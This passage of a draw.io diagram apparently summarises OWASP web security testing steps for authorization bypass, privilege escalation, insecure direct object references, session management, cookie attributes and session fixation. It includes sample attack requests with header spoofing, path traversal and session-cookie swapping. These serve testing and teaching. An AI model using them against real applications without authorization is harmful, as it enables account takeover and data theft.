200);&quot;&gt;username=example_user&lt;/i&gt;&lt;/div&gt;&lt;/i&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;div style=&quot;&quot;&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;POST /account/viewCCpincode HTTP/1.1&lt;/i&gt;&lt;/div&gt;&lt;i&gt;&lt;div style=&quot;&quot;&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Host: www.example.com&lt;/i&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;[other HTTP headers]&lt;/i&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Cookie: SessionID=&lt;b&gt;ATTACKER_SESSION&lt;/b&gt;&lt;/i&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;username=example_user&lt;/i&gt;&lt;/div&gt;&lt;/i&gt;&lt;p&gt;&lt;/p&gt;&lt;p style=&quot;&quot;&gt;&lt;b&gt;Testing for Vertical Bypassing Authorization Schema&lt;/b&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;div style=&quot;&quot;&gt;&lt;ol&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Register a user.&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Establish and maintain two different sessions based on the two different roles.&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;For every request, change the session identifier from the original to another role’s session identifier and evaluate the responses for each.&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;An application will be considered vulnerable if the weaker privileged session contains the same data, or indicate successful operations on higher privileged functions.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;/p&gt;&lt;p style=&quot;&quot;&gt;&lt;b&gt;Testing for Access to Administrative Functions&lt;/b&gt;&lt;br&gt;&lt;/p&gt;&lt;p style=&quot;&quot;&gt;The application will be considered vulnerable if any role other than administrator could access the administrator menu.&lt;br&gt;&lt;/p&gt;&lt;p style=&quot;&quot;&gt;&lt;b&gt;Testing for Special Request Header Handling&lt;/b&gt;&lt;br&gt;&lt;/p&gt;&lt;p style=&quot;&quot;&gt;Try to manipulate parameters in header (&quot;&lt;i&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;X-Original-URL&lt;/span&gt;&quot;&lt;/i&gt;, &quot;&lt;i&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;X-Rewrite-URL&lt;/span&gt;&quot;&lt;/i&gt;, &quot;&lt;i style=&quot;&quot;&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;X-Forwarded-For&lt;/span&gt;&quot;&lt;/i&gt;, &quot;&lt;i style=&quot;&quot;&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;X-Forward-For&lt;/span&gt;&quot;&lt;/i&gt;, &quot;&lt;i style=&quot;&quot;&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;X-Remote-IP&lt;/span&gt;&quot;&lt;/i&gt;, &quot;&lt;i style=&quot;&quot;&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;X-Originating-IP&lt;/span&gt;&quot;&lt;/i&gt;, &quot;&lt;i style=&quot;&quot;&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;X-Remote-Addr&lt;/span&gt;&quot;&lt;/i&gt;, &quot;&lt;i style=&quot;&quot;&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;X-Client-IP&lt;/span&gt;&quot;&lt;/i&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;) with different values (&quot;&lt;/span&gt;&lt;i style=&quot;&quot;&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;127.0.0.1&lt;/span&gt;&quot;&lt;/i&gt;, &quot;&lt;i style=&quot;&quot;&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;127.0.0.0/8&lt;/span&gt;&quot;&lt;/i&gt;, &quot;&lt;i style=&quot;&quot;&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;::1/128&lt;/span&gt;&quot;&lt;/i&gt;, &quot;&lt;i style=&quot;&quot;&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;localhost&lt;/span&gt;&quot;&lt;/i&gt;, &quot;&lt;i style=&quot;&quot;&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;10.0.0.0/8&lt;/span&gt;&quot;&lt;/i&gt;, &quot;&lt;i style=&quot;&quot;&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;172.16.0.0/12&lt;/span&gt;&quot;&lt;/i&gt;, &quot;&lt;i style=&quot;&quot;&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;192.168.0.0/16&lt;/span&gt;&quot;&lt;/i&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;).&lt;/span&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot; style=&quot;&quot;&gt;&lt;p style=&quot;&quot;&gt;Employ the least privilege principles on the users, roles, and resources to ensure that no unauthorized access occurs.&lt;/p&gt;&lt;p style=&quot;&quot;&gt;Tools: &lt;a href=&quot;https://www.zaproxy.org/&quot;&gt;OWASP ZAP&lt;/a&gt;, &lt;a href=&quot;https://www.zaproxy.org/docs/desktop/addons/access-control-testing/&quot;&gt;ZAP&#39;s Access Control Testing&amp;nbsp;add-on&lt;/a&gt;, &lt;a href=&quot;https://portswigger.net/burp&quot;&gt;Burp Suite&lt;/a&gt;,&amp;nbsp;&lt;a href=&quot;https://github.com/SecurityInnovation/AuthMatrix/&quot;&gt;Burp&#39;s AuthMatrix extension&lt;/a&gt;,&amp;nbsp;&lt;a href=&quot;https://github.com/Quitten/Autorize&quot;&gt;Burp&#39;s AuthMatrix extension Autorize&lt;/a&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="1060" width="400" x="1640" y="720" as="geometry" />
        </mxCell>
        <mxCell id="eA22UYvbJ53ypn8tL96o-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;fontFamily=Times New Roman;whiteSpace=wrap;align=left;autosize=0;expand=1;fixedWidth=0;resizable=1;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-ATHZ-03&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for Privilege Escalation&lt;/h1&gt;&lt;p style=&quot;&quot;&gt;Verify that it is not possible for a user to modify their privileges or roles inside the application in ways that could allow privilege escalation attacks.&lt;br&gt;&lt;/p&gt;&lt;p style=&quot;&quot;&gt;The degree of escalation depends on what privileges the attacker is authorized to possess, and what privileges can be obtained in a successful exploit.&lt;br&gt;&lt;/p&gt;&lt;p style=&quot;&quot;&gt;There are&amp;nbsp;vertical (access resources granted to more privileged accounts) and&amp;nbsp;horizontal (access resources granted to a similarly configured account) escalation.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p style=&quot;&quot;&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Try to manipulate values in request parameters (role, profile, condition, IP address).&lt;/span&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;POST /user/viewOrder.jsp HTTP/1.1&lt;br&gt;Host: www.example.com&lt;br&gt;groupID=&lt;b style=&quot;&quot;&gt;grp001&lt;/b&gt;&amp;amp;orderID=&lt;b style=&quot;&quot;&gt;0001&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;HTTP/1.1 200 OK&lt;br&gt;Server: Netscape-Enterprise/6.0&lt;br&gt;Date: Wed, 1 Apr 2006 13:51:20 GMT&lt;br&gt;Set-Cookie: USER=aW78ryrGrTWs4MnOd32Fs51yDqp; path=/; domain=www.example.com&lt;br&gt;Set-Cookie: SESSION=k+KmKeHXTgDi1J5fT7Zz; path=/; domain= www.example.com&lt;br&gt;Cache-Control: no-cache&lt;br&gt;Pragma: No-cache&lt;br&gt;Content-length: 247&lt;br&gt;Content-Type: text/html&lt;br&gt;Expires: Thu, 01 Jan 1970 00:00:00 GMT&lt;br&gt;Connection: close&lt;br&gt;&amp;lt;form&amp;nbsp; name=&quot;autoriz&quot; method=&quot;POST&quot; action = &quot;visual.jsp&quot;&amp;gt;&lt;br&gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;profile&quot; value=&quot;&lt;b style=&quot;&quot;&gt;SysAdmin&lt;/b&gt;&quot;&amp;gt;\&lt;br&gt;&amp;lt;body onload=&quot;document.forms.autoriz.submit()&quot;&amp;gt;&lt;br&gt;&amp;lt;/td&amp;gt;&lt;br&gt;&amp;lt;/tr&amp;gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;@0`1`3`3``0`UC`1`Status`OK`SEC`5`1`0`ResultSet`0`&lt;b style=&quot;&quot;&gt;PVValid&lt;/b&gt;`&lt;b style=&quot;&quot;&gt;-1&lt;/b&gt;`0`0` Notifications`0`0`3`Command&amp;nbsp; Manager`0`0`0` StateToolsBar`0`0`0`&lt;br&gt;StateExecToolBar`0`0`0`FlagsToolBar`0&lt;/i&gt;&lt;/p&gt;&lt;p style=&quot;&quot;&gt;Try to traverse the website and check if some of pages that may miss the authorization check.&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;/../.././&lt;b style=&quot;&quot;&gt;userInfo.html&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;div&gt;Check the strength of Session ID generation algorithm for vulnerability to brute Force attacks (&lt;i&gt;session_id=MD5(Password + UserID)&lt;/i&gt;).&lt;br&gt;&lt;/div&gt;&lt;p style=&quot;&quot;&gt;Tools: &lt;a href=&quot;https://www.zaproxy.org/&quot;&gt;OWASP ZAP&lt;/a&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="820" width="400" x="1640" y="1780" as="geometry" />
        </mxCell>
        <mxCell id="eA22UYvbJ53ypn8tL96o-2" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;fontFamily=Times New Roman;whiteSpace=wrap;align=left;autosize=0;expand=1;fixedWidth=0;resizable=1;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-ATHZ-04&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for Insecure Direct Object References&lt;/h1&gt;&lt;p style=&quot;&quot;&gt;Insecure Direct Object References allow attackers to bypass authorization and access resources directly by modifying the value of a parameter used to directly point to an object.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p style=&quot;&quot;&gt;Map out all locations in the application where user input is used to reference objects directly&lt;br&gt;&lt;/p&gt;&lt;p style=&quot;&quot;&gt;Modify the value of the parameter used to reference objects and assess whether it is possible to retrieve objects belonging to other users or otherwise bypass authorization.&lt;br&gt;&lt;/p&gt;&lt;p style=&quot;&quot;&gt;&lt;b&gt;The Value of a Parameter Is Used Directly to Retrieve a Database Record&lt;/b&gt;&lt;br&gt;&lt;/p&gt;&lt;p style=&quot;&quot;&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://foo.bar/somepage?invoice=&lt;b style=&quot;&quot;&gt;12345&lt;/b&gt;&lt;/i&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;The Value of a Parameter Is Used Directly to Perform an Operation in the System&lt;/b&gt;&lt;/p&gt;&lt;div&gt;&lt;div&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://foo.bar/changepassword?user=&lt;b style=&quot;&quot;&gt;someuser&lt;/b&gt;&lt;/i&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;The Value of a Parameter Is Used Directly to Retrieve a File System Resource&lt;/b&gt;&lt;/p&gt;&lt;div&gt;&lt;div&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://foo.bar/showImage?img=&lt;b style=&quot;&quot;&gt;img00011&lt;/b&gt;&lt;/i&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;The Value of a Parameter Is Used Directly to Access Application Functionality&lt;/b&gt;&lt;/p&gt;&lt;div&gt;&lt;div&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://foo.bar/accessPage?menuitem=&lt;b style=&quot;&quot;&gt;12&lt;/b&gt;&lt;/i&gt;&lt;/div&gt;&lt;/div&gt;" vertex="1">
          <mxGeometry height="560" width="400" x="1640" y="2600" as="geometry" />
        </mxCell>
        <mxCell id="HmCeEYs_6RkOunswEv-D-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;perimeter=rectanglePerimeter;fixDash=0;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-SESS-01&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for Session Management Schema&lt;/h1&gt;&lt;p&gt;Session Management -&amp;nbsp;mechanisms to store and validate credentials for a pre-determined timespan.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Gather session tokens, for the same user and for different users where possible.&lt;/li&gt;&lt;li&gt;Analyze and ensure that enough randomness exists to stop session forging attacks.&lt;/li&gt;&lt;li&gt;Modify cookies that are not signed and contain information that can be manipulated.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;All interaction between the client and application should be tested at least against the following criteria:&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Are all &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Set-Cookie&lt;/i&gt; directives tagged as &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Secure&lt;/i&gt;?&lt;/li&gt;&lt;li&gt;Do any Cookie operations take place over unencrypted transport?&lt;/li&gt;&lt;li&gt;Can the Cookie be forced over unencrypted transport?&lt;/li&gt;&lt;li&gt;If so, how does the application maintain security?&lt;/li&gt;&lt;li&gt;Are any Cookies persistent?&lt;/li&gt;&lt;li&gt;What &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Expires&lt;/i&gt; times are used on persistent cookies, and are they reasonable?&lt;/li&gt;&lt;li&gt;Are cookies that are expected to be transient configured as such?&lt;/li&gt;&lt;li&gt;What HTTP/1.1 &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Cache-Control&lt;/i&gt; settings are used to protect Cookies?&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Cookie Collection&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Make a list of received cookies and their characteristics: source pages, domain, value, persistance, etc.&lt;/p&gt;&lt;p&gt;Map application parts and required cookies.&lt;/p&gt;&lt;p&gt;Find events which create/modify/utilize/delete cookies.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Session Analysis&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Examine the structure and content of a Session ID:&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;Clear text&lt;/b&gt;:&amp;nbsp;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;192.168.100.1:owaspuser:password:15:58&lt;/i&gt;&lt;/li&gt;&lt;li&gt;&lt;b&gt;Hex&lt;/b&gt;: &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;3139322E3136382E&amp;lt;...&amp;gt;17373776F72643A31353A3538&lt;/i&gt;&lt;/li&gt;&lt;li&gt;&lt;b&gt;Base64&lt;/b&gt;: &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;MTkyLjE2OC4xMDAuMTp&amp;lt;...&amp;gt;zc3dvcmQ6MTU6NTg=&lt;/i&gt;&lt;/li&gt;&lt;li&gt;&lt;b&gt;MD5&lt;/b&gt;: &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;01c2fc4f0a817afd8366689bd29dd40a&lt;/i&gt;&lt;/li&gt;&lt;li&gt;&lt;b&gt;Hybrid&lt;/b&gt;:&amp;nbsp;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;owaspuser:192.168.100.1:a7656fafe94&amp;lt;...&amp;gt;70148412&lt;/i&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;Session ID Predictability and Randomness&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Analyze tokens to reveal any obvious patterns.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Time is an important factor which must also be controlled. High numbers of simultaneous connections should be made in order to gather samples in the same time window and keep that variable constant.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Cookie Reverse Engineering&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Collect a sufficient number of instances of a cookie and start looking for patterns in their value.&lt;br&gt;&lt;/p&gt;&lt;p&gt;The state of a session can have a heavy impact on collected cookies.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Always record the exact time when a cookie has been obtained, when there is the possibility that time plays a role in the value of the cookie.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Vary&amp;nbsp;all variables that could have influenced the cookie value.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Brute Force Attacks&lt;/b&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;The more complex and short lifetime, the more resistant to attack.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;The Session ID or Cookie configuration recomendation:&lt;br&gt;&lt;/p&gt;&lt;p&gt;should not be easily predictable;&lt;br&gt;&lt;/p&gt;&lt;p&gt;should be at least 50 characters length;&lt;br&gt;&lt;/p&gt;&lt;p&gt;should have a defined time-out;&lt;br&gt;&lt;/p&gt;&lt;p&gt;should be&amp;nbsp;non-persistent (only RAM memory);&lt;/p&gt;&lt;p&gt;should be supplemented by&amp;nbsp;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;secure&lt;/i&gt; flag (set only on HTTPS channel)&lt;br&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Set-Cookie: cookie=data; path=/; domain=.aaa.it; &lt;b&gt;secure&lt;/b&gt;&lt;/i&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;should be supplemented by&amp;nbsp;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;HTTPOnly&lt;/i&gt; option (not readable by a script)&lt;br&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Set-Cookie: cookie=data; path=/; domain=.aaa.it; &lt;b&gt;HttpOnly&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;Tools: &lt;a href=&quot;https://www.zaproxy.org/&quot;&gt;OWASP ZAP&lt;/a&gt;, &lt;a href=&quot;https://portswigger.net/burp/documentation/desktop/tools/sequencer&quot;&gt;Burp Suite Sequencer&lt;/a&gt;,&amp;nbsp;&lt;a href=&quot;https://github.com/yehgdotnet/JHijack&quot;&gt;YEHG’s JHijack&lt;/a&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="1360" width="400" x="2040" y="80" as="geometry" />
        </mxCell>
        <mxCell id="HmCeEYs_6RkOunswEv-D-2" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;perimeter=rectanglePerimeter;fixDash=0;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-SESS-02&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for Cookies Attributes&lt;/h1&gt;&lt;p&gt;The most used session storage mechanism in browsers is cookie storage.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Ensure that the proper security configuration is set for cookies.&lt;/p&gt;&lt;div&gt;&lt;hr id=&quot;null&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;Cookie Attributes&lt;/b&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;The &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Secure&lt;/i&gt; attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS.&lt;/p&gt;&lt;p&gt;The &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;HttpOnly&lt;/i&gt; attribute is used to help prevent attacks such as session leakage, since it does not allow the cookie to be accessed via a client-side script such as JavaScript.&lt;/p&gt;&lt;p&gt;The &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Domain&lt;/i&gt; attribute is used to compare the cookie’s domain against the domain of the server for which the HTTP request is being made.&lt;/p&gt;&lt;p&gt;The &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Path&lt;/i&gt; attribute&amp;nbsp;is used to compare the&amp;nbsp;domain and path.&lt;/p&gt;&lt;p&gt;The &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Expires&lt;/i&gt; attribute is used to&amp;nbsp;limit lifespan (set persistent&amp;nbsp;cookie or remove a cookie forcefully by setting it to a past date).&lt;/p&gt;&lt;p&gt;The &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;SameSite&lt;/i&gt; attribute is used to assert that a cookie ought not to be sent along with cross-site requests:&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Strict&lt;/i&gt; - the cookie will be sent only to first-party context without top-level navigation;&lt;/li&gt;&lt;li&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Lax&lt;/i&gt; - the cookie will be sent if the URL equals the cookie’s domain (first-party) even if the link is coming from a third-party domain;&lt;/li&gt;&lt;li&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;None&lt;/i&gt; - the cookie will be sent on cross-site requests only if the &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Secure&lt;/i&gt; attribute is also used (better than not specifying&amp;nbsp; &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;SameSite&lt;/i&gt; value at all);&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Cookie Prefixes&lt;/b&gt;&lt;/p&gt;&lt;p&gt;The &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;__Host-&lt;/i&gt; prefix expects cookies to fulfill the following conditions:&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;The cookie must be set with the &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Secure&lt;/i&gt; attribute.&lt;/li&gt;&lt;li&gt;The cookie must be set from a URI considered secure by the user agent.&lt;/li&gt;&lt;li&gt;Sent only to the host who set the cookie and MUST NOT include any &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Domain&lt;/i&gt; attribute.&lt;/li&gt;&lt;li&gt;The cookie must be set with the &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Path&lt;/i&gt; attribute with a value of / so it would be sent to every request to the host.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;The &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;__Secure-&lt;/i&gt; prefix (case-sensitive string)&amp;nbsp;expects cookies to fulfill the following conditions:&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;The cookie must be set with the &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Secure&lt;/i&gt; attribute.&lt;/li&gt;&lt;li&gt;The cookie must be set from a URI considered secure by the user agent.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;The more the cookie is locked down, the better.&lt;/p&gt;&lt;p&gt;The most secure cookie attribute configuration as: &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Set-Cookie: &lt;b&gt;__Host-&lt;/b&gt;SID=&amp;lt;session token&amp;gt;; &lt;b&gt;path&lt;/b&gt;=/; &lt;b&gt;Secure&lt;/b&gt;; &lt;b&gt;HttpOnly&lt;/b&gt;; &lt;b&gt;SameSite=Strict&lt;/b&gt;&lt;/i&gt;.&lt;/p&gt;&lt;p&gt;Tools:&amp;nbsp;Intercepting Proxies (&lt;a href=&quot;https://www.zaproxy.org/&quot;&gt;OWASP ZAP&lt;/a&gt;, &lt;a href=&quot;https://portswigger.net/&quot;&gt;Burp Suite&lt;/a&gt;),&amp;nbsp;Browser Plug-ins (&lt;a href=&quot;https://addons.mozilla.org/en-US/firefox/addon/tamper-data-for-ff-quantum/&quot;&gt;Tamper Data&lt;/a&gt;, &lt;a href=&quot;https://github.com/codebutler/firesheep&quot;&gt;FireSheep&lt;/a&gt;, &lt;a href=&quot;https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=en&quot;&gt;EditThisCookie&lt;/a&gt;, &lt;a href=&quot;https://addons.mozilla.org/en-US/firefox/addon/cookiebro/&quot;&gt;CookieBro&lt;/a&gt;).&lt;/p&gt;" vertex="1">
          <mxGeometry height="960" width="400" x="2040" y="1440" as="geometry" />
        </mxCell>
        <mxCell id="HmCeEYs_6RkOunswEv-D-3" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;perimeter=rectanglePerimeter;fixDash=0;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-SESS-03&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for Session Fixation&lt;/h1&gt;&lt;p&gt;Session fixation is enabled by the insecure practice of preserving the same value of the session cookies before and after authentication.&lt;br&gt;&lt;/p&gt;&lt;p&gt;This issue can be fixed by refreshing the session cookies after the authentication process. Alternatively, the attack can be prevented by ensuring the integrity of session cookies. When considering network attackers, i.e., attackers who control the network used by the victim, use full HSTS or add the &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;__Host-&lt;/i&gt; / &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;__Secure-&lt;/i&gt; prefix to the cookie name.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Analyze the authentication mechanism and its flow.&lt;/li&gt;&lt;li&gt;Force cookies and assess the impact.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;An example of request to the site to be tested:&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;GET / HTTP/1.1&lt;br&gt;Host: www.example.com&lt;/i&gt;&lt;/p&gt;&lt;p&gt;An example of response:&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;HTTP/1.1 200 OK&lt;br&gt;Date: Wed, 14 Aug 2008 08:45:11 GMT&lt;br&gt;Server: IBM_HTTP_Server&lt;br&gt;&lt;b&gt;Set-Cookie: JSESSIONID=0000d8eyYq3L0z2fgq10m4v-rt4:-1&lt;/b&gt;; Path=/; secure&lt;br&gt;Cache-Control: no-cache=&quot;set-cookie,set-cookie2&quot;&lt;br&gt;Expires: Thu, 01 Dec 1994 16:00:00 GMT&lt;br&gt;Keep-Alive: timeout=5, max=100&lt;br&gt;Connection: Keep-Alive&lt;br&gt;Content-Type: text/html;charset=Cp1254&lt;br&gt;Content-Language: en-US&lt;/i&gt;&lt;/p&gt;&lt;p&gt;An example of&amp;nbsp;authentication request with cookie:&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;POST /authentication.php HTTP/1.1&lt;br&gt;Host: www.example.com&lt;br&gt;[...]&lt;br&gt;Referer: http://www.example.com&lt;br&gt;&lt;b&gt;Cookie: JSESSIONID=0000d8eyYq3L0z2fgq10m4v-rt4:-1&lt;/b&gt;&lt;br&gt;Content-Type: application/x-www-form-urlencoded&lt;br&gt;Content-length: 57&lt;br&gt;Name=Meucci&amp;amp;wpPassword=secret!&amp;amp;wpLoginattempt=Log+in&lt;/i&gt;&lt;/p&gt;&lt;p&gt;An example of response without&amp;nbsp;new cookie:&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;HTTP/1.1 &lt;b&gt;200&lt;/b&gt; &lt;b&gt;OK&lt;/b&gt;&lt;br&gt;Date: Thu, 14 Aug 2008 14:52:58 GMT&lt;br&gt;Server: Apache/2.2.2 (Fedora)&lt;br&gt;X-Powered-By: PHP/5.1.6&lt;br&gt;Content-language: en&lt;br&gt;Cache-Control: private, must-revalidate, max-age=0&lt;br&gt;X-Content-Encoding: 